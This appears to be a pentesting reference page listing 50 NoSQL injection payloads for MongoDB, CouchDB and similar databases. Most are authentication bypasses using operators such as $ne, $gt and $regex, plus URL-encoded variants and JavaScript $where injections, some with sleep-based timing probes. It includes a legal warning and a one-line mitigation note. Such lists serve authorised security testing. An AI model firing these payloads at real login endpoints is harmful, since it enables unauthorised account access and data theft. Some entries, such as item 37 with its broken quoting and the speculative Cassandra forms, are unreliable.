---
title: "NoSQL injection payload"
tags:
  - NoSQL_injection
---

NoSQL injection is a technique used to exploit vulnerabilities in NoSQL databases by injecting malicious code into queries, similar to SQL injection but tailored to NoSQL query syntax like MongoDB, Cassandra, or CouchDB. Below is a list of 50 example payloads that could be used to test for NoSQL injection vulnerabilities. **Warning**: These payloads are for educational and testing purposes only, in controlled environments with explicit permission. Unauthorized use is illegal and unethical.

**Note**: The payloads are generalized and may need adaptation depending on the NoSQL database (e.g., MongoDB, CouchDB) and the application's query structure. Always test responsibly in a legal, authorized environment.

### MongoDB-Specific NoSQL Injection Payloads
MongoDB often uses JSON-like query syntax, so payloads target operators like `$ne`, `$eq`, `$gt`, `$regex`, etc.

1. `{"username": {"$ne": null}, "password": {"$ne": null}}` - Bypasses authentication by checking for non-null username/password.
2. `{"username": "admin", "password": {"$gt": ""}}` - Attempts to match any password greater than an empty string.
3. `{"username": {"$eq": "admin"}, "password": {"$exists": true}}` - Checks if the username is "admin" and password exists.
4. `{"$or": [{"username": "admin"}, {"password": "anything"}]}` - Uses `$or` to bypass authentication logic.
5. `{"username": {"$in": ["admin", "user"]}, "password": {"$ne": "wrong"}}` - Tests multiple usernames with a not-equal condition.
6. `{"username": {"$regex": ".*admin.*"}, "password": {"$ne": null}}` - Uses regex to match usernames containing "admin".
7. `{"username": {"$eq": "admin"}, "password": {"$type": 2}}` - Targets string-type passwords.
8. `{"username": {"$gt": ""}, "password": {"$gt": ""}}` - Matches any non-empty username and password.
9. `{"$where": "this.username == 'admin'"}` - Uses JavaScript-based `$where` clause to bypass checks.
10. `{"username": {"$ne": ""}, "password": {"$regex": "^.*$"}}` - Matches any non-empty username and any password.
11. `{"username": {"$eq": "admin"}, "password": {"$nin": ["invalid"]}}` - Excludes specific invalid passwords.
12. `{"username": "admin';return true;//", "password": "anything"}` - JavaScript injection for `$where` queries.
13. `{"username": {"$regex": "^a"}, "password": {"$exists": true}}` - Matches usernames starting with "a".
14. `{"$and": [{"username": "admin"}, {"password": {"$ne": "wrong"}}]}` - Combines conditions to bypass logic.
15. `{"username": {"$eq": "admin"}, "password": {"$size": 0}}` - Targets empty password arrays.
16. `{"username": {"$not": {"$eq": "guest"}}, "password": {"$ne": null}}` - Excludes "guest" usernames.
17. `{"username": {"$all": ["admin"]}, "password": {"$gt": ""}}` - Matches specific username arrays.
18. `{"username": {"$regex": "admin", "$options": "i"}, "password": {"$ne": null}}` - Case-insensitive username match.
19. `{"username": {"$elemMatch": {"$eq": "admin"}}, "password": {"$ne": ""}}` - Targets array elements.
20. `{"$where": "this.password.length > 0"}` - JavaScript to check non-empty passwords.

### General NoSQL Injection Payloads
These payloads target common NoSQL databases or generic query structures.

21. `username=admin&password[$ne]=null` - URL-encoded payload for bypassing authentication.
22. `username=admin&password[$gt]=` - Empty `$gt` to match any password.
23. `username[$eq]=admin&password[$exists]=true` - Checks for existing passwords.
24. `username[$regex]=.*admin.*&password[$ne]=null` - Regex-based username match.
25. `username=admin&password[$in][]=valid&password[$in][]=invalid` - Tests multiple password values.
26. `username[$ne]=guest&password[$ne]=null` - Excludes guest users.
27. `username[$or][][username]=admin&username[$or][][password]=anything` - OR condition in URL.
28. `username[$eq]=admin&password[$type]=string` - Targets string-type passwords.
29. `username=admin&password[$regex]=^.*$` - Matches any password.
30. `username[$not][$eq]=user&password[$ne]=null` - Excludes specific usernames.

### JavaScript Injection Payloads
For databases supporting JavaScript (e.g., MongoDB `$where`).

31. `{"$where": "return true"}` - Always-true condition to bypass authentication.
32. `{"$where": "this.username == 'admin' && this.password != 'wrong'"}` - Specific username/password check.
33. `{"$where": "sleep(1000);return true"}` - Tests for JavaScript execution delay.
34. `{"$where": "this.password == this.password"}` - Trivial true condition.
35. `{"$where": "this.username.length > 0"}` - Matches non-empty usernames.
36. `username=admin';sleep(1000);//&password=anything` - JavaScript delay injection.
37. `{"$where": "this.username.match(/admin/)}` - Regex-based username match in JavaScript.
38. `{"$where": "this.password == 'admin' || true"}` - Forces true with OR.
39. `{"$where": "function(){return true;}"}` - Anonymous function to return true.
40. `{"$where": "this.username == 'admin' && 1==1"}` - Adds trivial true condition.

### CouchDB/Cassandra/Other NoSQL Payloads
These target other NoSQL databases with different query structures.

41. `{"key": {"$eq": "admin"}, "value": {"$ne": null}}` - CouchDB-style key-value injection.
42. `{"selector": {"username": "admin", "password": {"$gt": ""}}}` - CouchDB selector query.
43. `{"selector": {"$or": [{"username": "admin"}, {"password": "test"}]}}` - CouchDB OR condition.
44. `username[$eq]=admin&password[$gt]=0` - Numeric comparison for Cassandra.
45. `{"query": "username = 'admin' OR 1=1"}` - Generic OR injection.
46. `{"filter": {"username": {"$contains": "admin"}}}` - Filter-based injection.
47. `{"username": {"$eq": "admin"}, "password": {"$isNotNull": true}}` - Non-null check.
48. `{"query": {"username": {"$like": "%admin%"}}}` - LIKE-style pattern matching.
49. `{"username": {"$in": ["admin", "root"]}, "password": {"$exists": true}}` - Multi-user check.
50. `{"selector": {"username": {"$regex": ".*"}, "password": {"$ne": null}}}` - Broad regex match.

### Notes
- **Context-Specific**: Payloads must be tailored to the database (e.g., MongoDB uses `$ne`, CouchDB uses `selector`). Test the database type first.
- **Encoding**: For web applications, payloads may need URL or JSON encoding (e.g., `[$ne]` becomes `%5B%24ne%5D`).
- **Ethical Use**: Only test systems you own or have explicit permission to test. Unauthorized testing is illegal.
- **Mitigation**: Developers should sanitize inputs, use parameterized queries, and avoid exposing query operators to user input.

